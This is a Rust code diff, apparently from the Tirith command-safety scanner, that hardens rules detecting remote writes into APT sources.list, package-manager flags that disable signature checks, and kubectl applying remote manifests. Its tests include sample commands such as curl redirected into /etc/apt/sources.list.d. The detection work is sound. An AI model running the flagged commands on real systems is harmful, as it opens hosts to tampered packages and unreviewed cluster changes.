@@ -39,7 +39,8 @@ fn strip_quotes(s: &str) -> &str {
 
 /// Effective command base name: path basename, lowercased, `.exe` stripped.
 fn cmd_base(raw: &str, shell: ShellType) -> String {
-    let unq = strip_quotes(raw);
+    let normalized = crate::rules::command::normalize_shell_token(raw, shell);
+    let unq = normalized.as_str();
     let after_path = match shell {
         ShellType::PowerShell | ShellType::Cmd => unq.rsplit(['/', '\\']).next().unwrap_or(unq),
         _ => unq.rsplit('/').next().unwrap_or(unq),
@@ -352,34 +353,332 @@ fn is_raw_remote_manifest(url: &str) -> bool {
 
 // ── repo_add_from_pipe ───────────────────────────────────────────────────────
 
-/// Whether the raw segment contains a `>` / `>>` redirect whose target is an
-/// apt sources.list file. Tolerant of the redirect operator being glued to the
-/// path (`>/etc/apt/...`) or separated by whitespace.
-fn redirect_targets_sources_list(raw: &str) -> bool {
-    let lower = raw.to_ascii_lowercase();
-    let bytes = lower.as_bytes();
+/// Whether a concrete path names APT's primary source file or an entry under
+/// `sources.list.d`.  Keep this path predicate separate from option/shell
+/// parsing so a mere mention of `sources.list` in an unrelated argument is not
+/// mistaken for a write target.
+fn is_apt_sources_path(value: &str) -> bool {
+    let normalized = lexical_posix_path(value);
+    normalized == "/etc/apt/sources.list"
+        || normalized.starts_with("/etc/apt/sources.list.d/")
+        || normalized == "etc/apt/sources.list"
+        || normalized.starts_with("etc/apt/sources.list.d/")
+}
+
+fn lexical_posix_path(value: &str) -> String {
+    let raw = strip_quotes(value).replace('\\', "/").to_ascii_lowercase();
+    let absolute = raw.starts_with('/');
+    let mut components: Vec<&str> = Vec::new();
+    for component in raw.split('/') {
+        match component {
+            "" | "." => {}
+            ".." if components.last().is_some_and(|last| *last != "..") => {
+                components.pop();
+            }
+            ".." if !absolute => components.push(component),
+            ".." => {}
+            _ => components.push(component),
+        }
+    }
+    format!(
+        "{}{}",
+        if absolute { "/" } else { "" },
+        components.join("/")
+    )
+}
+
+fn is_apt_sources_dir(value: &str) -> bool {
+    lexical_posix_path(value).trim_end_matches('/') == "/etc/apt/sources.list.d"
+}
+
+/// Parse shell output redirections outside quotes and report whether stdout is
+/// directed at an APT sources path.  This is deliberately a small redirection
+/// grammar rather than a substring search: quoted `>` bytes are data, not shell
+/// operators, and the target may be attached (`>/etc/...`) or separated.
+fn redirect_targets_sources_list(raw: &str, shell: ShellType) -> bool {
+    #[derive(Clone, Copy, PartialEq, Eq)]
+    enum Quote {
+        None,
+        Single,
+        Double,
+    }
+
+    let chars: Vec<char> = raw.chars().collect();
+    let mut quote = Quote::None;
+    let mut escaped = false;
     let mut i = 0;
-    while i < bytes.len() {
-        if bytes[i] == b'>' {
-            // Skip `>>` + whitespace, then read the redirect target token.
-            let mut j = i + 1;
-            while j < bytes.len() && bytes[j] == b'>' {
-                j += 1;
+    while i < chars.len() {
+        let ch = chars[i];
+        if escaped {
+            escaped = false;
+            i += 1;
+            continue;
+        }
+        let escape = match shell {
+            ShellType::PowerShell => '`',
+            _ => '\\',
+        };
+        if ch == escape && quote != Quote::Single {
+            escaped = true;
+            i += 1;
+            continue;
+        }
+        match (quote, ch) {
+            (Quote::None, '\'') => {
+                quote = Quote::Single;
+                i += 1;
+                continue;
             }
-            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
-                j += 1;
+            (Quote::None, '"') => {
+                quote = Quote::Double;
+                i += 1;
+                continue;
             }
-            let target_start = j;
-            while j < bytes.len() && !bytes[j].is_ascii_whitespace() {
-                j += 1;
+            (Quote::Single, '\'') => {
+                quote = Quote::None;
+                i += 1;
+                continue;
             }
-            let target = &lower[target_start..j];
-            if target.contains("sources.list") {
+            (Quote::Double, '"') => {
+                quote = Quote::None;
+                i += 1;
+                continue;
+            }
+            _ => {}
+        }
+        if quote != Quote::None || ch != '>' {
+            i += 1;
+            continue;
+        }
+
+        // An IO-number other than stdout redirects a different descriptor, not
+        // the downloaded body. Require a token boundary before the digits so a
+        // normal argument ending in `2` is not misclassified as descriptor 2.
+        let mut fd_start = i;
+        while fd_start > 0 && chars[fd_start - 1].is_ascii_digit() {
+            fd_start -= 1;
+        }
+        let fd_has_boundary = fd_start == 0
+            || chars[fd_start - 1].is_whitespace()
+            || matches!(chars[fd_start - 1], '|' | ';' | '&');
+        if fd_start < i && fd_has_boundary {
+            let descriptor: String = chars[fd_start..i].iter().collect();
+            if descriptor.parse::<u32>().ok() != Some(1) {
+                i += 1;
+                continue;
+            }
+        }
+        let mut j = i + 1;
+        while j < chars.len() && (chars[j] == '>' || chars[j] == '|') {
+            j += 1;
+        }
+        if chars.get(j) == Some(&'&') {
+            j += 1;
+        }
+        while j < chars.len() && chars[j].is_whitespace() {
+            j += 1;
+        }
+
+        let mut target = String::new();
+        let mut target_quote = Quote::None;
+        let mut target_escaped = false;
+        while j < chars.len() {
+            let c = chars[j];
+            if target_escaped {
+                target.push(c);
+                target_escaped = false;
+                j += 1;
+                continue;
+            }
+            if c == escape && target_quote != Quote::Single {
+                target_escaped = true;
+                j += 1;
+                continue;
+            }
+            match (target_quote, c) {
+                (Quote::None, '\'') => target_quote = Quote::Single,
+                (Quote::None, '"') => target_quote = Quote::Double,
+                (Quote::Single, '\'') | (Quote::Double, '"') => target_quote = Quote::None,
+                (Quote::None, _) if c.is_whitespace() || matches!(c, '|' | ';' | '&') => break,
+                _ => target.push(c),
+            }
+            j += 1;
+        }
+        if is_apt_sources_path(&target) {
+            return true;
+        }
+        i = j.max(i + 1);
+    }
+    false
+}
+
+/// Collect values for a long option and a value-taking short option.  Long
+/// options accept separate and `=` forms.  Short options accept separate,
+/// attached, and common boolean clusters (`-fsSLoPATH`, `-qOPATH`). The
+/// command-specific value-taking set prevents an earlier option's argument
+/// from being reinterpreted as a nested output option; unknown short options
+/// are conservatively treated like booleans because an accepted future flag
+/// must not reopen this execution-boundary bypass.
+fn collect_command_option_values(
+    args: &[String],
+    shell: ShellType,
+    long: &str,
+    short: char,
+    value_taking_short_options: &str,
+) -> Vec<String> {
+    let mut values = Vec::new();
+    let long_equals = format!("{long}=");
+    let mut i = 0;
+    'args: while i < args.len() {
+        let normalized = crate::rules::command::normalize_shell_token(&args[i], shell);
+        let arg = normalized.as_str();
+        if arg == "--" {
+            break;
+        }
+        if arg == long {
+            if let Some(value) = args.get(i + 1) {
+                values.push(crate::rules::command::normalize_shell_token(value, shell));
+                i += 2;
+                continue;
+            }
+        } else if let Some(value) = arg.strip_prefix(&long_equals) {
+            values.push(value.to_string());
+        } else if arg.starts_with('-') && !arg.starts_with("--") {
+            let cluster = &arg[1..];
+            for (offset, candidate) in cluster.char_indices() {
+                if candidate == short {
+                    let after = &cluster[offset + short.len_utf8()..];
+                    let attached = after.strip_prefix('=').unwrap_or(after);
+                    if !attached.is_empty() {
+                        values.push(attached.to_string());
+                        i += 1;
+                    } else if let Some(value) = args.get(i + 1) {
+                        values.push(crate::rules::command::normalize_shell_token(value, shell));
+                        i += 2;
+                    } else {
+                        i += 1;
+                    }
+                    continue 'args;
+                }
+                if value_taking_short_options.contains(candidate) {
+                    // The rest of this token is this earlier option's value.
+                    let after = &cluster[offset + candidate.len_utf8()..];
+                    i += if after.is_empty() && args.get(i + 1).is_some() {
+                        2
+                    } else {
+                        1
+                    };
+                    continue 'args;
+                }
+            }
+        }
+        i += 1;
+    }
+    values
+}
+
+fn downloader_targets_sources_list(base: &str, args: &[String], shell: ShellType) -> bool {
+    let destinations = match base {
+        "curl" => collect_command_option_values(
+            args,
+            shell,
+            "--output",
+            'o',
+            "AbcCdDeEFhHKmPQrTtUuwxXyYz",
+        ),
+        "wget" => collect_command_option_values(
+            args,
+            shell,
+            "--output-document",
+            'O',
+            "aABeIiIloPQRTtUuwWX",
+        ),
+        _ => Vec::new(),
+    };
+    if destinations
+        .iter()
+        .any(|destination| is_apt_sources_path(destination))
+    {
+        return true;
+    }
+    match base {
+        "curl" => {
+            let output_dirs = collect_command_option_values(
+                args,
+                shell,
+                "--output-dir",
+                '\0',
+                "AbcCdDeEFhHKmoPQrTtUuwxXyYz",
+            );
+            output_dirs.iter().any(|path| is_apt_sources_dir(path))
+                && (!destinations.is_empty() || curl_uses_remote_name(args, shell))
+        }
+        "wget" => collect_command_option_values(
+            args,
+            shell,
+            "--directory-prefix",
+            'P',
+            "aABeIiIloQRTtUuwWX",
+        )
+        .iter()
+        .any(|path| is_apt_sources_dir(path)),
+        _ => false,
+    }
+}
+
+fn curl_uses_remote_name(args: &[String], shell: ShellType) -> bool {
+    const VALUE_SHORT: &str = "AbcCdDeEFhHKmoPQrTtUuwxXyYz";
+    for arg in args {
+        let arg = crate::rules::command::normalize_shell_token(arg, shell);
+        if arg == "--" {
+            break;
+        }
+        if arg == "--remote-name" || arg == "--remote-name-all" {
+            return true;
+        }
+        if !arg.starts_with('-') || arg.starts_with("--") {
+            continue;
+        }
+        for option in arg[1..].chars() {
+            if option == 'O' {
                 return true;
             }
-            i = j.max(i + 1);
-        } else {
-            i += 1;
+            if VALUE_SHORT.contains(option) {
+                break;
+            }
+        }
+    }
+    false
+}
+
+fn is_pipe_separator(separator: Option<&str>) -> bool {
+    matches!(separator, Some("|") | Some("|&"))
+}
+
+/// Inclusive start of the contiguous pipeline that ends at `sink_idx`.
+fn pipeline_start(segments: &[tokenize::Segment], sink_idx: usize) -> usize {
+    let mut start = sink_idx;
+    while start > 0 && is_pipe_separator(segments[start].preceding_separator.as_deref()) {
+        start -= 1;
+    }
+    start
+}
+
+fn tee_targets_sources_list(args: &[String], shell: ShellType) -> bool {
+    let mut positional_only = false;
+    for arg in args {
+        let normalized = crate::rules::command::normalize_shell_token(arg, shell);
+        let arg = normalized.as_str();
+        if !positional_only && arg == "--" {
+            positional_only = true;
+            continue;
+        }
+        if !positional_only && arg.starts_with('-') && arg != "-" {
+            // tee's flags do not consume a separate output-path value.
+            continue;
+        }
+        if is_apt_sources_path(arg) {
+            return true;
         }
     }
     false
@@ -393,18 +692,14 @@ fn check_repo_add_from_pipe(
     shell: ShellType,
     findings: &mut Vec<Finding>,
 ) {
-    let sources_list_marker = |s: &str| {
-        let l = s.to_ascii_lowercase();
-        l.contains("sources.list.d/") || l.ends_with("sources.list") || l.contains("/sources.list")
-    };
-
-    // Pipe form: a `tee` stage touching a sources.list path, preceded by `|`.
+    // Pipe form: a `tee` stage touching a sources.list path. Trace the entire
+    // contiguous pipeline, not just the adjacent transformer, back to a network
+    // producer (`curl | sed | doas tee ...`).
     for (i, seg) in segments.iter().enumerate() {
         if i == 0 {
             continue;
         }
-        let is_pipe = matches!(seg.preceding_separator.as_deref(), Some("|") | Some("|&"));
-        if !is_pipe {
+        if !is_pipe_separator(seg.preceding_separator.as_deref()) {
             continue;
         }
         let Some((base, args)) = resolve_command(seg, shell) else {
@@ -413,33 +708,34 @@ fn check_repo_add_from_pipe(
         if base != "tee" {
             continue;
         }
-        let touches_sources = args.iter().any(|a| sources_list_marker(strip_quotes(a)));
+        let touches_sources = tee_targets_sources_list(args, shell);
         if !touches_sources {
             continue;
         }
-        // The upstream must be a network fetch (a local `cat` into tee is not the
-        // attack). Resolve through `resolve_command` so `sudo curl …` is not
-        // hidden behind the `sudo` wrapper.
-        let upstream_base = resolve_command(&segments[i - 1], shell)
-            .map(|(base, _)| base)
-            .unwrap_or_default();
-        if !is_fetch_command(&upstream_base) {
+        let start = pipeline_start(segments, i);
+        let has_network_producer = segments[start..i].iter().any(|upstream| {
+            resolve_command(upstream, shell)
+                .is_some_and(|(upstream_base, _)| is_fetch_command(&upstream_base))
+        });
+        if !has_network_producer {
             continue;
         }
-        push_repo_add(segments, i, findings);
+        push_repo_add(segments, start, i, shell, findings);
         return;
     }
 
-    // Redirect form: `curl ... > /etc/apt/sources.list.d/foo.list` (the `>` may
-    // or may not be followed by whitespace).
+    // Direct-write forms: shell stdout redirection, curl `-o`/`--output`, and
+    // wget `-O`/`--output-document`, with attached/separate/equals values.
     for seg in segments {
-        let Some((base, _)) = resolve_command(seg, shell) else {
+        let Some((base, args)) = resolve_command(seg, shell) else {
             continue;
         };
         if !is_fetch_command(&base) {
             continue;
         }
-        if redirect_targets_sources_list(&seg.raw) {
+        if redirect_targets_sources_list(&seg.raw, shell)
+            || downloader_targets_sources_list(&base, args, shell)
+        {
             findings.push(Finding {
                 rule_id: RuleId::RepoAddFromPipe,
                 severity: Severity::High,
@@ -463,15 +759,32 @@ fn check_repo_add_from_pipe(
     }
 }
 
-fn push_repo_add(segments: &[tokenize::Segment], tee_idx: usize, findings: &mut Vec<Finding>) {
-    let upstream = &segments[tee_idx - 1];
-    let pipeline = format!("{} | {}", upstream.raw, segments[tee_idx].raw);
+fn push_repo_add(
+    segments: &[tokenize::Segment],
+    start_idx: usize,
+    tee_idx: usize,
+    shell: ShellType,
+    findings: &mut Vec<Finding>,
+) {
+    let mut pipeline = segments[start_idx].raw.clone();
+    for segment in &segments[start_idx + 1..=tee_idx] {
+        pipeline.push(' ');
+        pipeline.push_str(segment.preceding_separator.as_deref().unwrap_or("|"));
+        pipeline.push(' ');
+        pipeline.push_str(&segment.raw);
+    }
     let mut evidence = vec![Evidence::CommandPattern {
         pattern: "fetch | tee sources.list".to_string(),
         matched: redact::redact_shell_assignments(&pipeline),
     }];
-    for url in extract_remote_urls(&upstream.args) {
-        evidence.push(Evidence::Url { raw: url });
+    for upstream in &segments[start_idx..tee_idx] {
+        if let Some((base, args)) = resolve_command(upstream, shell) {
+            if is_fetch_command(&base) {
+                for url in extract_remote_urls(args) {
+                    evidence.push(Evidence::Url { raw: url });
+                }
+            }
+        }
     }
     findings.push(Finding {
         rule_id: RuleId::RepoAddFromPipe,
@@ -492,10 +805,91 @@ fn push_repo_add(segments: &[tokenize::Segment], tee_idx: usize, findings: &mut 
 
 // ── unsigned_repo_trust ─────────────────────────────────────────────────────
 
+/// Treat a recognized boolean as disabled only for the explicit false forms.
+/// Unknown/empty/dynamic values are conservative: at a pre-execution boundary
+/// Tirith cannot prove that they keep verification enabled.
+fn boolean_option_enables_danger(value: &str) -> bool {
+    !matches!(
+        strip_quotes(value).trim().to_ascii_lowercase().as_str(),
+        "0" | "false" | "no" | "off"
+    )
+}
+
+fn apt_config_disables_authentication(assignment: &str) -> bool {
+    let assignment = strip_quotes(assignment).trim();
+    let (key, value) = assignment
+        .split_once('=')
+        .map(|(key, value)| (key.trim(), value.trim()))
+        .unwrap_or((assignment, ""));
+    let key = key.to_ascii_lowercase();
+    matches!(
+        key.as_str(),
+        "apt::get::allowunauthenticated"
+            | "acquire::allowinsecurerepositories"
+            | "acquire::allowdowngradetoinsecurerepositories"
+            | "acquire::allowweakrepositories"
+    ) && boolean_option_enables_danger(value)
+}
+
+/// Parse APT's real option grammar and return the authentication/signature
+/// override that weakens the transaction. Supports options before or after the
+/// subcommand, boolean `=value` forms, and `-o`/`--option` configuration in
+/// separate, attached, and equals forms.
+fn apt_signature_disable_option(args: &[String], shell: ShellType) -> Option<String> {
+    const BOOLEAN_FLAGS: &[&str] = &[
+        "--allow-unauthenticated",
+        "--allow-insecure-repositories",
+        "--allow-downgrades-to-insecure-repositories",
+        "--allow-weak-repositories",
+    ];
+
+    let mut i = 0;
+    while i < args.len() {
+        let normalized = crate::rules::command::normalize_shell_token(&args[i], shell);
+        let arg = normalized.as_str();
+        if arg == "--" {
+            break;
+        }
+        let lower = arg.to_ascii_lowercase();
+        if BOOLEAN_FLAGS.contains(&lower.as_str()) {
+            return Some(arg.to_string());
+        }
+        if let Some((flag, value)) = lower.split_once('=') {
+            if BOOLEAN_FLAGS.contains(&flag) && boolean_option_enables_danger(value) {
+                return Some(arg.to_string());
+            }
+        }
+
+        let config = if arg == "-o" || arg == "--option" {
+            args.get(i + 1)
+                .map(|value| crate::rules::command::normalize_shell_token(value, shell))
+        } else if let Some(value) = arg.strip_prefix("--option=") {
+            Some(value.to_string())
+        } else if let Some(value) = arg.strip_prefix("-o=") {
+            Some(value.to_string())
+        } else {
+            arg.strip_prefix("-o")
+                .filter(|value| !value.is_empty())
+                .map(str::to_string)
+        };
+        if let Some(config) = config {
+            if apt_config_disables_authentication(&config) {
+                return Some(config);
+            }
+            if arg == "-o" || arg == "--option" {
+                i += 2;
+                continue;
+            }
+        }
+        i += 1;
+    }
+    None
+}
+
 /// apt repos with signature verification turned off:
 ///  - `[trusted=yes]` option inside a sources entry,
-///  - `--allow-unauthenticated`,
-///  - `--allow-insecure-repositories`.
+///  - `--allow-*` authentication/repository flags,
+///  - `-o` / `--option` insecure APT configuration assignments.
 fn check_unsigned_repo_trust(
     segments: &[tokenize::Segment],
     shell: ShellType,
@@ -538,29 +932,26 @@ fn check_unsigned_repo_trust(
         if !is_apt {
             continue;
         }
-        for arg in args {
-            let a = strip_quotes(arg).to_ascii_lowercase();
-            if a == "--allow-unauthenticated" || a == "--allow-insecure-repositories" {
-                findings.push(Finding {
-                    rule_id: RuleId::UnsignedRepoTrust,
-                    severity: Severity::High,
-                    title: "APT signature verification disabled".to_string(),
-                    description: format!(
-                        "`{a}` tells apt to install packages even when their GPG signature \
-                         cannot be verified. This removes the authenticity guarantee for every \
-                         package in the transaction."
-                    ),
-                    evidence: vec![Evidence::CommandPattern {
-                        pattern: "apt unauthenticated flag".to_string(),
-                        matched: redact::redact_shell_assignments(&seg.raw),
-                    }],
-                    human_view: None,
-                    agent_view: None,
-                    mitre_id: None,
-                    custom_rule_id: None,
-                });
-                return;
-            }
+        if let Some(option) = apt_signature_disable_option(args, shell) {
+            findings.push(Finding {
+                rule_id: RuleId::UnsignedRepoTrust,
+                severity: Severity::High,
+                title: "APT signature verification disabled".to_string(),
+                description: format!(
+                    "`{option}` tells apt to accept unauthenticated, insecure, or weak \
+                     repository content. This removes the authenticity guarantee for packages \
+                     in the transaction."
+                ),
+                evidence: vec![Evidence::CommandPattern {
+                    pattern: "apt authentication override".to_string(),
+                    matched: redact::redact_shell_assignments(&seg.raw),
+                }],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            });
+            return;
         }
     }
 }
@@ -645,7 +1036,9 @@ fn check_gpg_check_disabled(
         }
     }
 
-    // `--nogpgcheck` flag — only on dnf/yum/zypper/pacman.
+    // Native signature-disable flags. dnf/yum use `--nogpgcheck`; zypper uses
+    // the distinct `--no-gpg-checks` spelling. Boolean equals forms are parsed
+    // conservatively rather than compared as opaque strings.
     for seg in segments {
         let Some((base, args)) = resolve_command(seg, shell) else {
             continue;
@@ -658,19 +1051,28 @@ fn check_gpg_check_disabled(
             continue;
         }
         for arg in args {
-            let a = strip_quotes(arg).to_ascii_lowercase();
-            if a == "--nogpgcheck" {
+            let a = crate::rules::command::normalize_shell_token(arg, shell).to_ascii_lowercase();
+            if a == "--" {
+                break;
+            }
+            let (flag, enabled) = a
+                .split_once('=')
+                .map(|(flag, value)| (flag, boolean_option_enables_danger(value)))
+                .unwrap_or((a.as_str(), true));
+            let disables_signatures =
+                flag == "--nogpgcheck" || (flag == "--no-gpg-checks" && base == "zypper");
+            if disables_signatures && enabled {
                 findings.push(Finding {
                     rule_id: RuleId::GpgCheckDisabled,
                     severity: Severity::High,
-                    title: "Package signature checking disabled (--nogpgcheck)".to_string(),
+                    title: format!("Package signature checking disabled ({flag})"),
                     description: format!(
-                        "`{base} --nogpgcheck` installs packages without verifying their GPG \
+                        "`{base} {flag}` installs packages without verifying their GPG \
                          signatures. A spoofed or compromised mirror can serve arbitrary \
                          packages that will be installed without warning."
                     ),
                     evidence: vec![Evidence::CommandPattern {
-                        pattern: "--nogpgcheck flag".to_string(),
+                        pattern: "package-manager signature-disable flag".to_string(),
                         matched: redact::redact_shell_assignments(&seg.raw),
                     }],
                     human_view: None,
@@ -733,9 +1135,159 @@ fn raw_has_siglevel_never(raw: &str) -> bool {
 
 // ── kubectl_apply_remote ────────────────────────────────────────────────────
 
-/// `kubectl apply -f <remote URL>` where the URL is a raw remote manifest or a
-/// shortened URL. A plain `kubectl apply -f ./local.yaml` or `-k ./overlay`
-/// must NOT fire.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum KubectlManifestKind {
+    Filename,
+    Kustomize,
+}
+
+impl KubectlManifestKind {
+    fn label(self) -> &'static str {
+        match self {
+            Self::Filename => "filename",
+            Self::Kustomize => "kustomize",
+        }
+    }
+}
+
+#[derive(Debug, PartialEq, Eq)]
+struct KubectlManifestInput {
+    kind: KubectlManifestKind,
+    value: String,
+}
+
+/// Parse a pflag shorthand cluster and return a manifest option plus its
+/// optional attached value. `-R` (recursive) and `-q` are boolean shorthands,
+/// so a following `f`/`k` may still be the value-taking option (`-RfURL`). Any
+/// other shorthand consumes a value or is rejected by kubectl, so it cannot be
+/// skipped as though it were a boolean prefix.
+fn kubectl_short_manifest_option(arg: &str) -> Option<(KubectlManifestKind, Option<&str>)> {
+    let cluster = arg.strip_prefix('-')?;
+    if cluster.is_empty() || cluster.starts_with('-') {
+        return None;
+    }
+    for (offset, candidate) in cluster.char_indices() {
+        let kind = match candidate {
+            'f' => KubectlManifestKind::Filename,
+            'k' => KubectlManifestKind::Kustomize,
+            'R' | 'q' => continue,
+            _ => return None,
+        };
+        let after = &cluster[offset + candidate.len_utf8()..];
+        let attached = if after.is_empty() {
+            None
+        } else {
+            Some(after.strip_prefix('=').unwrap_or(after))
+        };
+        return Some((kind, attached));
+    }
+    None
+}
+
+/// kubectl's `filename` flag is a pflag StringSlice: one option value is parsed
+/// as CSV, so a local first entry cannot hide a remote later entry. Use the
+/// repository's CSV parser rather than splitting naively so an intentionally
+/// quoted local filename containing a comma retains its real argv semantics.
+fn kubectl_filename_values(value: &str) -> Result<Vec<String>, String> {
+    let normalized = strip_quotes(value);
+    let mut reader = csv::ReaderBuilder::new()
+        .has_headers(false)
+        .flexible(false)
+        .from_reader(normalized.as_bytes());
+    let mut records = reader.records();
+    let record = records
+        .next()
+        .transpose()
+        .map_err(|error| format!("filename CSV is invalid: {error}"))?
+        .ok_or_else(|| "filename option has an empty value".to_string())?;
+    if records.next().is_some() {
+        return Err("filename option contains multiple CSV records".to_string());
+    }
+    let mut values = Vec::with_capacity(record.len());
+    for field in record.iter() {
+        let field = strip_quotes(field);
+        if field.is_empty() {
+            return Err("filename option contains an empty path".to_string());
+        }
+        values.push(field.to_string());
+    }
+    Ok(values)
+}
+
+/// Parse kubectl/oc's repeatable manifest-source options. pflag accepts a
+/// non-boolean shorthand's value as the remainder of the same token, so
+/// `-fURL` and `-kURL` are first-class forms alongside separate and long-equals
+/// forms. A malformed targeted option is returned as an error rather than
+/// silently reclassified as a clean invocation.
+fn collect_kubectl_manifest_inputs(
+    args: &[String],
+    shell: ShellType,
+) -> Result<Vec<KubectlManifestInput>, String> {
+    let mut inputs = Vec::new();
+    let mut i = 0;
+    while i < args.len() {
+        let normalized = crate::rules::command::normalize_shell_token(&args[i], shell);
+        let arg = normalized.as_str();
+        if arg == "--" {
+            break;
+        }
+
+        let (kind, attached, consumes_next) = if arg == "--filename" {
+            (KubectlManifestKind::Filename, None, true)
+        } else if arg == "--kustomize" {
+            (KubectlManifestKind::Kustomize, None, true)
+        } else if let Some(value) = arg.strip_prefix("--filename=") {
+            (KubectlManifestKind::Filename, Some(value), false)
+        } else if let Some(value) = arg.strip_prefix("--kustomize=") {
+            (KubectlManifestKind::Kustomize, Some(value), false)
+        } else if let Some((kind, attached)) = kubectl_short_manifest_option(arg) {
+            (kind, attached, attached.is_none())
+        } else {
+            i += 1;
+            continue;
+        };
+
+        let value = if consumes_next {
+            let Some(next) = args
+                .get(i + 1)
+                .map(|value| crate::rules::command::normalize_shell_token(value, shell))
+            else {
+                return Err(format!("{} option is missing its value", kind.label()));
+            };
+            i += 2;
+            next
+        } else {
+            i += 1;
+            attached.unwrap_or_default().to_string()
+        };
+        if value.is_empty() {
+            return Err(format!("{} option has an empty value", kind.label()));
+        }
+        let values = match kind {
+            KubectlManifestKind::Filename => kubectl_filename_values(&value)?,
+            KubectlManifestKind::Kustomize => vec![value],
+        };
+        for value in values {
+            inputs.push(KubectlManifestInput { kind, value });
+        }
+    }
+    Ok(inputs)
+}
+
+fn is_remote_kustomize_source(value: &str) -> bool {
+    let lower = value.to_ascii_lowercase();
+    is_remote_url(value)
+        || lower.starts_with("git::")
+        || lower.starts_with("ssh://")
+        || lower.starts_with("git@")
+        || lower.starts_with("github.com/")
+        || lower.starts_with("gitlab.com/")
+        || lower.starts_with("bitbucket.org/")
+}
+
+/// `kubectl apply -f/-k <remote source>` where the source is a raw remote
+/// manifest, shortened URL, or remote kustomize root. Plain local paths and
+/// stdin (`-f -`) must NOT fire.
 fn check_kubectl_apply_remote(
     segments: &[tokenize::Segment],
     shell: ShellType,
@@ -758,8 +1310,41 @@ fn check_kubectl_apply_remote(
             continue;
         }
 
-        for url in collect_flag_values(args, &["-f", "--filename"]) {
-            if !is_remote_url(&url) {
+        let manifest_inputs = match collect_kubectl_manifest_inputs(args, shell) {
+            Ok(inputs) => inputs,
+            Err(reason) => {
+                findings.push(Finding {
+                    rule_id: RuleId::KubectlApplyRemote,
+                    severity: Severity::High,
+                    title: format!(
+                        "kubectl {} manifest source could not be validated",
+                        subcmd.as_deref().unwrap_or("apply")
+                    ),
+                    description: format!(
+                        "The kubectl manifest option grammar is ambiguous ({reason}). Tirith \
+                         cannot prove that the execution boundary uses only a local reviewed \
+                         manifest, so it is rejected conservatively."
+                    ),
+                    evidence: vec![Evidence::CommandPattern {
+                        pattern: "kubectl manifest option parse ambiguity".to_string(),
+                        matched: redact::redact_shell_assignments(&seg.raw),
+                    }],
+                    human_view: None,
+                    agent_view: None,
+                    mitre_id: None,
+                    custom_rule_id: None,
+                });
+                return;
+            }
+        };
+
+        for manifest in manifest_inputs {
+            let url = manifest.value;
+            let remote = match manifest.kind {
+                KubectlManifestKind::Filename => is_remote_url(&url),
+                KubectlManifestKind::Kustomize => is_remote_kustomize_source(&url),
+            };
+            if !remote {
                 continue;
             }
             let shortened = is_shortener_url(&url);
@@ -787,14 +1372,15 @@ fn check_kubectl_apply_remote(
                     subcmd.as_deref().unwrap_or("apply")
                 ),
                 description: format!(
-                    "`kubectl {} -f` is given {why}. The manifest can create privileged \
+                    "`kubectl {}` is given {why} through its `{}` option. The manifest can create privileged \
                      workloads, RBAC bindings, or admission webhooks in the cluster, and its \
                      contents are not inspected before being applied.",
-                    subcmd.as_deref().unwrap_or("apply")
+                    subcmd.as_deref().unwrap_or("apply"),
+                    manifest.kind.label(),
                 ),
                 evidence: vec![
                     Evidence::CommandPattern {
-                        pattern: "kubectl apply -f remote".to_string(),
+                        pattern: format!("kubectl apply {} remote", manifest.kind.label()),
                         matched: redact::redact_shell_assignments(&seg.raw),
                     },
                     Evidence::Url { raw: url },
@@ -1125,12 +1711,29 @@ const KUBECTL_VALUE_FLAGS: &[&str] = &[
     "--token",
     "--as",
     "--as-group",
+    "--as-uid",
+    "--username",
+    "--password",
     "--cache-dir",
     "--certificate-authority",
     "--client-certificate",
     "--client-key",
     "--request-timeout",
     "--tls-server-name",
+    "--profile",
+    "--profile-output",
+    "--log-backtrace-at",
+    "--log-dir",
+    "--log-file",
+    "--log-file-max-size",
+    "--log-flush-frequency",
+    "--stderrthreshold",
+    "-v",
+    "--v",
+    "--vmodule",
+    // OpenShift `oc` persistent value flags.
+    "--config",
+    "--loglevel",
 ];
 
 /// helm global flags that take a *separate* value token (same hazard as
@@ -1235,6 +1838,7 @@ fn extract_remote_urls(args: &[String]) -> Vec<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+    use crate::extract::ScanContext;
 
     fn has(input: &str, shell: ShellType, rule: RuleId) -> bool {
         check(input, shell).iter().any(|f| f.rule_id == rule)
@@ -1242,6 +1846,30 @@ mod tests {
 
     fn none(input: &str, shell: ShellType) -> bool {
         check(input, shell).is_empty()
+    }
+
+    fn engine_has(input: &str, shell: ShellType, rule: RuleId) -> bool {
+        let context = crate::engine::AnalysisContext {
+            input: input.to_string(),
+            shell,
+            scan_context: ScanContext::Exec,
+            raw_bytes: None,
+            interactive: false,
+            cwd: None,
+            file_path: None,
+            repo_root: None,
+            is_config_override: false,
+            clipboard_html: None,
+            card_ref: None,
+            clipboard_source: crate::clipboard::ClipboardSourceState::AbsentOrInvalid,
+        };
+        crate::engine::analyze_with_policy_without_bypass(
+            &context,
+            &crate::policy::Policy::default(),
+        )
+        .findings
+        .iter()
+        .any(|finding| finding.rule_id == rule)
     }
 
     // ── repo_add_from_pipe ──────────────────────────────────────────────────
@@ -1319,18 +1947,99 @@ mod tests {
     #[test]
     fn test_redirect_targets_sources_list_helper() {
         assert!(redirect_targets_sources_list(
-            "curl x > /etc/apt/sources.list.d/y"
+            "curl x > /etc/apt/sources.list.d/y",
+            ShellType::Posix,
         ));
         assert!(redirect_targets_sources_list(
-            "curl x >/etc/apt/sources.list"
+            "curl x >/etc/apt/sources.list",
+            ShellType::Posix,
         ));
         assert!(redirect_targets_sources_list(
-            "curl x >> /etc/apt/sources.list.d/y"
+            "curl x >> /etc/apt/sources.list.d/y",
+            ShellType::Posix,
+        ));
+        assert!(redirect_targets_sources_list(
+            "curl x >&/etc/apt/./sources.list.d/y",
+            ShellType::Posix,
+        ));
+        assert!(redirect_targets_sources_list(
+            "curl x 01>/tmp/../etc/apt/sources.list",
+            ShellType::Posix,
         ));
         // A `>` redirect to an unrelated file must not match.
-        assert!(!redirect_targets_sources_list("curl x > /tmp/out.txt"));
+        assert!(!redirect_targets_sources_list(
+            "curl x > /tmp/out.txt",
+            ShellType::Posix,
+        ));
         // `sources.list` mentioned but not as a redirect target.
-        assert!(!redirect_targets_sources_list("cat /etc/apt/sources.list"));
+        assert!(!redirect_targets_sources_list(
+            "cat /etc/apt/sources.list",
+            ShellType::Posix,
+        ));
